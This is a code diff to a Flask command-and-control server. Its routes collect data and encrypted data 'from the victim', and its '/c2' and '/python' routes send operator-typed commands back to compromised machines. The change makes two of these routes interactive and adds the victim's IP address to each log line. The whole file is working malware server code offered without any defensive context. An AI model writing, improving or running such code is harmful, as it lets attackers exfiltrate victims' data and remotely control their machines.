@@ -11,38 +11,27 @@ views = Blueprint("views", __name__)
 
 @views.route("/", methods=["POST"])
 def home():
-    print("")
-    print(Fore.RED + f"Data from the victim")
-    print(Fore.WHITE + str(request.data))
+    print(Fore.RED + f"{request.remote_addr}: " + str(request.data))
     print(Style.RESET_ALL)
-    print("")
     return "Data recieved!"
 
 @views.route("/enc", methods=["POST"])
 def encrypt():
-    print("")
-    print(Fore.RED + f"Encrypted data from the victim")
-    print(Fore.WHITE + str(request.data))
+    print(Fore.RED + f"{request.remote_addr}: " + str(request.data))
     print(Style.RESET_ALL)
-    print("")
     return "Data recieved!"
 
 @views.route("/c2", methods=["POST"])
 def c2():
-    print("")
-    print(Fore.RED + f"Remote connection")
-    print(Fore.RED + "Connected to the victim, send STOP to end the session")
-    print(Fore.WHITE + str(request.data))
+    print(Fore.RED + f"{request.remote_addr}: " + str(request.data))
     print(Style.RESET_ALL)
-    print("")
-    dictToSend = input("")
+    dictToSend = input(Fore.CYAN + "> ")
     return dictToSend
 
 @views.route("/python", methods=["POST"])
 def python():
-    print("")
-    print(Fore.RED + f"Data from victim")
     input_json = request.get_json(force=True) 
-    print(Fore.WHITE + str(input_json))
-    dictToReturn = str(Fore.WHITE + "Alive")
+    print(Fore.RED + f"{request.remote_addr}: " + str(input_json))
+    print(Style.RESET_ALL)
+    dictToReturn = input(Fore.CYAN + "> ")
     return jsonify(dictToReturn)
